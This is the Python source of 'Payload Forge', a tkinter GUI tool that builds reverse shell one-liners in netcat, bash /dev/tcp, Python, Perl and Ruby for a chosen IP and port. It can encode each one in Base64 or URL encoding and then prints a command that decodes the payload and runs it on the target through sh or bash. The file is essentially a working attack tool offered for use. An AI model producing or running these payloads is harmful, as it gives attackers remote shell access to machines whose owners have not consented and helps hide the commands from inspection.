import tkinter as tk
import base64
import urllib.parse


class Tooltip:
    def __init__(self, widget, text):
        self.widget = widget
        self.text = text
        self.tooltip = None
        self.widget.bind("<Enter>", self.on_enter)
        self.widget.bind("<Leave>", self.on_leave)

    def on_enter(self, event):
        x, y, _, _ = self.widget.bbox("insert")
        x += self.widget.winfo_rootx() + 25
        y += self.widget.winfo_rooty() + 25

        self.tooltip = tk.Toplevel(self.widget)
        self.tooltip.wm_overrideredirect(True)
        self.tooltip.wm_geometry(f"+{x}+{y}")

        label = tk.Label(self.tooltip, text=self.text, background="yellow", relief="solid", borderwidth=1)
        label.pack()

    def on_leave(self, event):
        if self.tooltip:
            self.tooltip.destroy()
            self.tooltip = None

def generate_payload():
    # Get user inputs
    shell_choice = shell_var.get()
    encoding_choice = encoding_var.get()
    ip = ip_entry.get()
    port = port_entry.get()

    # Generate payload based on user choices
    payload = ""
    if shell_choice == "Netcat":
        netcat_version_fix = netcat_var.get()
        if netcat_version_fix:
            payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
        else:
            payload = f"nc -e /bin/sh {ip} {port}"
    elif shell_choice == "Python":
        payload = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"
    elif shell_choice == "Bash":
        payload = f"bash -l > /dev/tcp/{ip}/{port} 0<&1 2>&1"
    elif shell_choice == "Perl":
        payload = f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    elif shell_choice == "Ruby":
        payload = f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

    # Encode payload if selected
    encoded_payload = payload
    decoded_command = f"echo {encoded_payload} | sh"
    if encoding_choice == "Base64":
        encoded_payload = base64.b64encode(payload.encode()).decode()
        decoded_command = f"echo {encoded_payload} | base64 -d | bash"
    elif encoding_choice == "URL Encoding":
        encoded_payload = urllib.parse.quote_plus(payload)
        decoded_command = f"echo {encoded_payload} | sed 's/+/ /g;s/%/\\\\x/g' | xargs -0 printf | sh"

    # Display generated payload, encoded payload, and command in the GUI
    output_text.delete(1.0, tk.END)
    output_text.insert(tk.END,
                       f"Plain Text Payload:\n{payload}\n\nEncoded Payload:\n{encoded_payload}\n\nCommand to decode and run on target:\n{decoded_command}")


# Create GUI
root = tk.Tk()
root.title("Payload Forge")
root.geometry("590x450")
# Set the system icon
#app.iconphoto(True, tk.PhotoImage(file="icon.png"))
root.iconbitmap("icon.ico")


# Add tooltips for shell choices
shell_var = tk.StringVar()
shell_var.set("Netcat")
shell_label = tk.Label(root, text="Select Shell:")
shell_label.place(x=10, y=10)
shell_choices = ["Netcat", "Python", "Bash", "Perl", "Ruby"]
for i, choice in enumerate(shell_choices):
    rb = tk.Radiobutton(root, text=choice, variable=shell_var, value=choice)
    rb.place(x=120 + 75 * i, y=10)
    Tooltip(rb, f"Select {choice} shell")

# Netcat version fix option for mismatched versions
netcat_var = tk.BooleanVar()
netcat_var.set(False)  # Default to not fixing Netcat versions
netcat_checkbox = tk.Checkbutton(root, text="Fix Netcat Version Mismatch", variable=netcat_var)
netcat_checkbox.place(x=120, y=45)
Tooltip(netcat_checkbox, "Enable to fix Netcat version mismatch")

# Encoding choices
encoding_var = tk.StringVar()
encoding_var.set("Base64")
encoding_label = tk.Label(root, text="Select Encoding:")
encoding_label.place(x=10, y=85)
encoding_choices = ["Base64", "URL Encoding", "None"]
for i, choice in enumerate(encoding_choices):
    rb = tk.Radiobutton(root, text=choice, variable=encoding_var, value=choice)
    rb.place(x=120 + 100 * i, y=10 + 20 * (len(shell_choices) + 0))
    Tooltip(rb, f"Select {choice} encoding method")

# IP and Port entries
ip_label = tk.Label(root, text="Enter IP:")
ip_label.place(x=10, y=10 + 25 * (len(shell_choices) + 2))
ip_entry = tk.Entry(root)
ip_entry.place(x=120, y=10 + 25 * (len(shell_choices) + 2))
port_label = tk.Label(root, text="Enter Port:")
port_label.place(x=300, y=10 + 25 * (len(shell_choices) + 2))
port_entry = tk.Entry(root)
port_entry.place(x=400, y=10 + 25 * (len(shell_choices) + 2))

# Generate button
generate_button = tk.Button(root, text="Generate Payload", command=generate_payload)
generate_button.place(x=230, y=10 + 25 * (len(shell_choices) + 3))

# Output text area
output_text = tk.Text(root, height=10, width=70)
output_text.place(x=10, y=10 + 25 * (len(shell_choices) + 5))
Tooltip(shell_label, "Select the type of shell to use for the payload")
Tooltip(encoding_label, "Select the encoding method for the payload")
Tooltip(ip_label, "Enter the IP address of the target")
Tooltip(port_label, "Enter the port number of the target")
Tooltip(ip_entry, "Enter the IP address of the target")
Tooltip(port_entry, "Enter the port number of the target")

root.mainloop()
